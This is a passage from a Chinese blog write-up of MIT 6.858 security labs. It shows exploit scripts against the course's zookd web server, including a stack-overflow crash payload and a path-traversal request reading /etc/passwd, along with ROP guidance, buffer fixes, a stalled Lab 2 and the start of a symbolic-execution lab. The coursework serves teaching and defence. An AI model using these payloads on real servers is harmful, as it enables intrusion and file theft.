class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>笔者的解法简单来说是用 malloc 来分配一个 chunk 往上面写字符串，之后 <code>unlink(chunk)</code> 即可</p><p><img src="https://s2.loli.net/2022/12/04/O5euynk9jE3GoH7.png" alt="image.png"></p><p>使用如下命令进行检查：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-libc</span><br></code></pre></td></tr></table></figure><p>通过√</p><p><img src="https://s2.loli.net/2022/12/04/ElDbUBFJ3rqatNW.png" alt="image.png"></p><p>然后是一个 <em>Challenge</em> ，<strong>在不依赖 <code>accidentally()</code> 函数的情况下构造 ROP</strong>，提示了我们可以使用 ROPgadget 来寻找 gadget ：</p><blockquote><p><em>Challenge! (optional)</em> The <code>accidentally</code> function is a bit artificial. For extra credit, figure out how to perform the return-to-libc attack without relying on that function (delete it and find another way to make your exploit work). Provide your attack in <code>exploit-challenge.py</code>. Also, briefly explain the attack and provide ROP gadgets you use in <code>answers.txt</code>.</p><p>You will need to find another chunk of code to reuse that gives you control over <code>%rdi</code>. You can read through the disassembly (e.g. using <code>objdump</code>) to look for useful ROP gadgets.</p><p>Because of the nature of x86/x86-64, you can use another technique to find sequences of instructions that don’t even appear in the disassembly! Instructions are variable-length (from 1 to 15 bytes), and by causing a misaligned parse (by jumping into the middle of an intended instruction), you can cause a sequence of machine code to be misinterpreted. For example, the instruction sequence <code>pop %r15; ret</code> corresponds to the machine code <code>41 5F C3</code>. But instead of executing from the start of this instruction stream, if you jump 1 byte in, the machine code <code>5F C3</code> corresponds to the assembly <code>pop %rdi; ret</code>.</p><p>Automated tools such as <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget.py</a> can assist you in searching for ROP gadgets, even finding gadgets that arise from misaligned parses. The 6.858 VM already has <code>ROPgadget</code> installed.</p><p>You may find it useful to search for ROP gadgets not just in the <code>zookd</code> binary but in other libraries that <code>zookd</code> loads at runtime. To see these libraries, and the addresses at which they are loaded, you can run <strong>( ulimit -s unlimited &amp;&amp; setarch -R ldd zookd-nxstack )</strong>. The <code>ulimit</code> and <code>setarch</code> commands set up the same environment used by <code>clean-env.sh</code>, so that <code>ldd</code> prints the same addresses that will be used at runtime.</p></blockquote><p>笔者一开始的思路就是不用  <code>accidentally()</code> （非常莫名其妙的一个函数），所以等于是直接通过了（笑）</p><h2 id="Part-4-Fixing-buffer-overflows-and-other-bugs">Part 4: Fixing buffer overflows and other bugs</h2><p>这一块就是两个 Exercise， 先看 Exercise 6，让我们寻找程序中的其他漏洞（至少两个，除了 <code>zoobar</code> 中的以外，那个是留给未来的其他 labs 的）：</p><blockquote><p><strong>Exercise 6.</strong> Look through the source code and try to find more vulnerabilities that can allow an attacker to compromise the security of the web server. Describe the attacks you have found in <code>answers.txt</code>, along with an explanation of the limitations of the attack, what an attacker can accomplish, why it works, and how you might go about fixing or preventing it. You should ignore bugs in <code>zoobar</code>’s code. They will be addressed in future labs.</p><p>One approach for finding vulnerabilities is to trace the flow of inputs controlled by the attacker through the server code. At each point that the attacker’s input is used, consider all the possible values the attacker might have provided at that point, and what the attacker can achieve in that manner.</p><p>You should find at least two vulnerabilities for this exercise.</p></blockquote><p><s>源码审计还是比较简单的，但是</s>笔者审了大半天好像也没找到除了上面的 bug 以外的 bug，还好后面还是找到了一些</p><p>首先是在 <code>process_client()</code> 中存储请求 URL 的长度的位置存在一个栈溢出，因为一次最多一行读 8192 字节，但这里明显没有预留足够的空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> env[<span class="hljs-number">8192</span>];  <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">size_t</span> env_len = <span class="hljs-number">8192</span>;<br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">4096</span>];<span class="hljs-comment">// 只留了4096字节</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errmsg;<br><br>    <span class="hljs-comment">/* get the request line */</span> <span class="hljs-comment">// 这里一次最多读 8192 字节</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_line(fd, reqpath, env, &amp;env_len)))<br></code></pre></td></tr></table></figure><p>简单测试一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET /&quot;</span> + <span class="hljs-string">b&quot;arttnba3&quot;</span> * <span class="hljs-number">768</span> + <span class="hljs-string">b&quot; HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>成功 crash，不过这里并非因为非法返回地址 crash，而是因为我们覆写掉了栈上的 <code>errmsg</code> 变量导致非法内存引用从而 crash</p><p><img src="https://s2.loli.net/2022/12/04/t9vq36KXmZOIslJ.png" alt="image.png"></p><p>第二个漏洞是在 <code>http_serve</code> 中存在目录穿越的问题，由于没有对路径做过滤及判断，这可以让我们访问到服务器根目录外的文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">http_serve</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span><br>&#123;<br>    <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *) = http_serve_none;<br>    <span class="hljs-type">char</span> pn[<span class="hljs-number">2048</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><br>    getcwd(pn, <span class="hljs-keyword">sizeof</span>(pn));<br>    setenv(<span class="hljs-string">&quot;DOCUMENT_ROOT&quot;</span>, pn, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(name) + <span class="hljs-built_in">strlen</span>(pn) + <span class="hljs-number">1</span> &gt;= <span class="hljs-keyword">sizeof</span>(pn)) &#123;<br>        http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;Request too long&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">strncat</span>(pn, name, <span class="hljs-keyword">sizeof</span>(pn) - <span class="hljs-built_in">strlen</span>(pn) - <span class="hljs-number">1</span>);<br>    split_path(pn);<br><br>    <span class="hljs-keyword">if</span> (!stat(pn, &amp;st))<br>    &#123;<br>        <span class="hljs-comment">/* executable bits -- run as CGI script */</span><br>        <span class="hljs-keyword">if</span> (valid_cgi_script(&amp;st))<br>            handler = http_serve_executable;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (S_ISDIR(st.st_mode))<br>            handler = http_serve_directory;<br>        <span class="hljs-keyword">else</span><br>            handler = http_serve_file;<br>    &#125;<br><br>    handler(fd, pn);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">http_serve_file</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *pn)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    <span class="hljs-keyword">if</span> ((filefd = open(pn, O_RDONLY)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;open %s: %s&quot;</span>, pn, strerror(errno));<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BSD</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>    <span class="hljs-keyword">if</span> (!fstat(filefd, &amp;st))<br>        len = st.st_size;<br>    <span class="hljs-keyword">if</span> (sendfile(fd, filefd, <span class="hljs-number">0</span>, len) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-keyword">if</span> (sendfile(filefd, fd, <span class="hljs-number">0</span>, &amp;len, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;sendfile&quot;</span>);<br>    close(filefd);<br>&#125;<br></code></pre></td></tr></table></figure><p>简单写个脚本测试下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET /../../../../etc/passwd&quot;</span> + <span class="hljs-string">b&quot; HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;REQUEST_URI: &quot;</span> + <span class="hljs-string">b&quot;index.html&quot;</span>  + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>成功访问到 <code>/etc/passwd</code></p><p><img src="https://s2.loli.net/2022/12/04/dlv6JVCk91QhcyW.png" alt="image.png"></p><p>Exercise 6 里说 <code>You should find at least two vulnerabilities for this exercise.</code> ，笔者已经找足两个，满足了题目要求，就不继续找更多的了（笑）<s>👴选择直接摆大烂</s></p><p>接下来看最后一个 Exercise，让我们进行漏洞修复，主要是修找到的栈溢出漏洞：</p><blockquote><p><strong>Exercise 7.</strong> For each buffer overflow vulnerability you have exploited in Exercises 2, 4, and 5, fix the web server’s code to prevent the vulnerability in the first place. Do not rely on compile-time or runtime mechanisms such as <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries">stack canaries</a>, removing <code>-fno-stack-protector</code>, baggy bounds checking, etc.</p><p>Make sure that your code actually stops your exploits from working. Use <strong>make check-fixed</strong> to run your exploits against your modified source code (as opposed to the staff reference binaries from <code>bin.tar.gz</code>). These checks should report FAIL (i.e., exploit no longer works). If they report PASS, this means the exploit still works, and you did not correctly fix the vulnerability.</p><p>Note that your submission should <em>not</em> make changes to the <code>Makefile</code> and other grading scripts. We will use our unmodified version during grading.</p><p>You should also make sure your code still passes all tests using <strong>make check</strong>, which uses the unmodified lab binaries.</p></blockquote><p>主要是修这两个地方：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_headers</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>    <span class="hljs-type">char</span> value[<span class="hljs-number">8192</span>];<br>    <span class="hljs-type">char</span> envvar[<span class="hljs-number">8192</span>];<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">8192</span>];<br></code></pre></td></tr></table></figure><p>使用如下命令进行检查，攻击全部失败代表成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-fixed</span><br></code></pre></td></tr></table></figure><p>成功通过√</p><p><img src="https://s2.loli.net/2022/12/04/6XNYjFW7BdPr1Re.png" alt="image.png"></p><p>至此， Lab1 全部完成</p><h1>0x02.Lab 2: Privilege separation and server-side sandboxing（uncompleted）</h1><h2 id="Introduction">Introduction</h2><p>这一个 lab 主要是关于 <strong>权限分离</strong> （privilege separation）与 <strong>服务器侧沙箱</strong>（server-side sandboxing），这一部分我们主要通过一个 MIT 编写的名为 <code>zoobar</code> 的 python web 应用来完成，其中权限隔离的目的是保证攻击者在破坏程序的一部分时不会破坏到程序的另一部分，该 lab 将使用 <a href="https://linuxcontainers.org/">Linux containers</a> 来完成</p><blockquote><p>此前的 lab 中使用的是在课上讲过的 OKWS web server（<s>👴没听课，寄了</s>）</p></blockquote><p>本 lab 中我们将完成一个权限隔离的 web server，检查看你的漏洞，并将程序代码分割成需要更少权限的内容快以最小化单个漏洞的影响，同时我们还将扩展 Zoobar 以使其支持  <em>可执行配置文件</em>  （executable profiles），这允许我们使用 python 来作为配置文件，并完成不同用户配置文件的隔离，这允许用户在其配置文件中实现不同的功能，例如：</p><ul><li>一个按用户名欢迎访客的 profile</li><li>一个记录最后几位访客的 profile</li><li>一个为每位访客提供 zoobar 的 profile（限制为每分钟1位）</li></ul><p>这需要沙箱化服务器上的 profile code 从而避免任意代码执行或任意文件访问，此外，这些代码或许需要保持记录一些文件中的数据，或是访问 zoobar 数据库以正确执行，我们将使用名为库的远程过程与 lab 提供的一些代码来沙箱化可执行配置文件</p><blockquote><p>实验手册原文就挺乱七八糟的，👴愣是没咋看明白，<s>也可能是👴的英文水平太垃圾了</s></p></blockquote><p>那么接下来首先还是把代码切到 lab2 的分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git add answers.txt exploit-*.py http.c zookd.c [and any other new files...]</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -am <span class="hljs-string">&quot;lab1 solution completed&quot;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git pull</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab2 origin/lab2</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git merge lab1</span><br></code></pre></td></tr></table></figure><p>之后还是先 <code>make</code> 检查一下，没报错就 🆗：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o zookfs.o zookfs.c<br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o http2.o http2.c<br>cc -m64  zookfs.o http2.o   -o zookfs<br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o zookd2.o zookd2.c<br>cc -m64  zookd2.o http2.o   -o zookd2<br></code></pre></td></tr></table></figure><h2 id="Prelude-What’s-a-zoobar">Prelude: What’s a zoobar?</h2><p>为了理解 <code>zoobar</code>，我们首先过一下部分源码</p><p><code>zoobar</code> 的一个重要特性是允许在用户之间传递凭证（credits），这由 <code>transfer.py</code> 实现，我们可以启动 zoobar 感受一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./zookld.py</span><br></code></pre></td></tr></table></figure><p>这玩意需要 python 的 <code>lxc</code> 模块才能跑，但是笔者怎么都安不上…<s>lab2 就此完结</s></p><p>笔者最终选择  <em>放弃使用自己搭建的实验环境</em>  ，重新使用 MIT 提供的 VM 镜像环境去做实验，但是在执行 <code>./zookld.py</code> 时又遇到了一个问题：</p><p><img src="https://s2.loli.net/2022/12/07/E5rjcJBSFHQOifo.png" alt="image.png"></p><p>那么这个问题的出现是因为 <strong>Ubuntu 21.10 已经停止更新</strong>，我们来看 <code>zookld.py</code> 的逻辑，比较简单，主要就是直接调用 <code>zookconf.py</code> 里的 <code>boot()</code> 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zookconf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) == <span class="hljs-number">2</span>:<br>        zookconf.boot(sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">else</span>:<br>        zookconf.boot()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    zookconf.restart_with_cgroups()<br>    <span class="hljs-keyword">if</span> os.geteuid() == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Running zookld.py as root! In order to clean up &quot;</span><br>        <span class="hljs-string">&quot;containers from this run, you must run zookclean.py as root as well.&quot;</span>,<br>        file=sys.stderr)<br>    main()<br></code></pre></td></tr></table></figure><p>里面存在这样一个调用链：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">boot()<br>Container.__init__()<br>    Container.make_container()<br>        Container.make_base()<br>            Container.configure_base()<br></code></pre></td></tr></table></figure><p>在 <code>configure_base()</code> 中有着一个调用 <code>apt-get</code> 的逻辑，由于 <strong>Ubuntu 21.10 已经 <a href="https://help.ubuntu.com/community/EOLUpgrades">EOL</a> 了，所以这一步是必然会失败的</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">configure_base</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># ...</span><br>    <span class="hljs-comment"># install packages for zoobar</span><br>    <span class="hljs-comment"># terminate early if anything goes wrong here</span><br>    r = self.run_cmd([<span class="hljs-string">&quot;apt-get&quot;</span>, <span class="hljs-string">&quot;update&quot;</span>], extra_env_vars=ev)<br>    <span class="hljs-keyword">if</span> r != <span class="hljs-number">0</span>:<br>        self.errormsg(<span class="hljs-string">&quot;Failed updating apt package info&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    r = self.run_cmd([<span class="hljs-string">&quot;apt-get&quot;</span>, <span class="hljs-string">&quot;install&quot;</span>, <span class="hljs-string">&quot;-y&quot;</span>] + pkgs, extra_env_vars=ev)<br>    <span class="hljs-keyword">if</span> r != <span class="hljs-number">0</span>:<br>        self.errormsg(<span class="hljs-string">&quot;Failed installing packages&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><blockquote><p>参见 <a href="https://askubuntu.com/questions/1420190/upgrade-to-22-04-impish-release-no-longer-has-a-release-file">ask ubuntu</a> 与 <a href="https://fridge.ubuntu.com/2022/07/19/ubuntu-21-10-impish-indri-end-of-life-reached-on-july-14-2022/">Ubuntu Fridge</a></p><blockquote><p><s>👴真的麻了，这实验™是 MIT 今年春季学期发布的，用个 20.04 这样的 LTS 不好🐎，用个就只剩几个🈷寿命的 21.10 就离谱</s></p></blockquote></blockquote><p>MIT 估计是不会修这个问题了，而下一次的实验手册得等到 2023 年的春季学期才能上线，那这里笔者只能自行尝试解决这个问题了: (</p><p>这里笔者试了好几种方法都没能成功将 Ubuntu 21.10 升级成 22.04 或是其他的可用版本，最后笔者将 <code>apt-get</code> 替换成 <code>apt</code> 之后倒是能跑了，不过<strong>无法正常访问 zoobar 服务器</strong>，会报一个 module not found 但是实际上已经安装有对应模块的错误 : (</p><blockquote><p>这里先🕊了，要是之后能重新做上再补，还好几个 lab 之间并非依赖关系可以让笔者先往后继续做 lab3 : )</p></blockquote><h1>0x03.Lab 3: Symbolic execution</h1><h2 id="Introduction-2">Introduction</h2><p>本 lab 将教大家使用 <strong>符号执行</strong> （<strong>symbolic execution</strong>） 这一强大的技术来寻找软件中的漏洞，在 lab 的最后我们将建立一个可以在 zoobar web 应用中寻找触发多种漏洞的符号执行系统（准确的说是一个<strong>混合执行</strong>（concolic execution）系统）</p><blockquote><p>关于什么是 concolic execution，可以看这张图</p><p><img src="https://s2.loli.net/2022/10/27/Fvl3yRNMnzKamfk.jpg" alt="concolic execution"></p></blockquote><p>在 <a href="http://css.csail.mit.edu/6.858/2022/readings/exe.pdf">EXE paper</a> 中描述了一个用于 C 程序的符号执行系统，为了简单化，该 lab 将通过修改 Python 对象与重载特定方法来为 Python 程序建立一个符号/混合执行系统，类似于 EXE，我们将使用一个 SMT （ <a href="https://en.wikipedia.org/wiki/Satisfiability_Modulo_Theories">Satisfiability Modulo Theories</a>，可满足性模理论）求解器来检查可满足的约束，这意味着我们的求解器可以检查同时包含传统布尔可满足性表达式与涉及其他“理论”的约束如整型、位向量、字符串等</p><p>本 lab 初始我们首先要通过计算 32 位有/无符号数的平均值来熟悉 <strong>Z3</strong>——一个流行的 SMT 求解器，接下来我们将为 Python 整型操作创建 wrappers（类似 EXE 提供了符号变量上的操作置换），并应用调用 Z3 的核心逻辑来探索可能的不同执行路径；最终我们将探索如何将其应用在 web 应用程序上，以对字符串进行求解，我们将为 Python 的字符串操作套一层 wrapper，在 SQLalchemy 数据库接口上应用对符号化友好的（symbolic-friendly）wrapper，并使用这个系统寻找 Zoobar 中的漏洞</p><blockquote><p>上面两段都是抄实验手册的</p></blockquote><p>接下来首先还是惯例地切换到 lab 3 的分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -am <span class="hljs-string">&#x27;lab2 completed&#x27;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git pull</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab3 origin/lab3</span><br></code></pre></td></tr></table></figure><p>这里注意不要将 lab 2 的代码合并到 lab 3 里边，因为我们的符号执行系统无法通过 RPC 追踪多进程间的符号约束，所以我们在一个没有进行权限分离的 Zoobar 上进行符号执行</p><p>接下来是检查代码可用性：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check</span><br></code></pre></td></tr></table></figure><p>结果如下就🆗，需要注意的是符号执行系统是 CPU 密集型的，因此对于不开启 KVM 支持的 QEMU 而言会非常慢：</p><p><img src="https://s2.loli.net/2022/12/12/AlWaHU6RhcE3TpN.png" alt="image.png">、</p><h2 id="Using-an-SMT-solver">Using an SMT solver</h2><p>符号执行的核心是 <strong>可满足性模理论求解器</strong>（<strong>Satisfiability Modulo Theory solver</strong>， 即 <code>SMT solver</code>），在本 lab 中我们将使用微软开发的 <a href="https://github.com/Z3Prover/z3">Z3 solver</a> 的 Python-based API（参见 <a href="https://ericpony.github.io/z3py-tutorial/">z3py tutorial</a> &amp; <a href="https://z3prover.github.io/api/html/namespacez3py.html">documentation for Z3’s Python API</a>），并使用  <a href="https://rise4fun.com/z3/tutorialcontent/sequences">Z3’s support for strings</a>；本 Lab 带有一个构建自 <a href="https://github.com/Z3Prover/z3">Z3 github repo</a> 的 Z3</p><p>实验提供了 <code>int-avg.py</code> 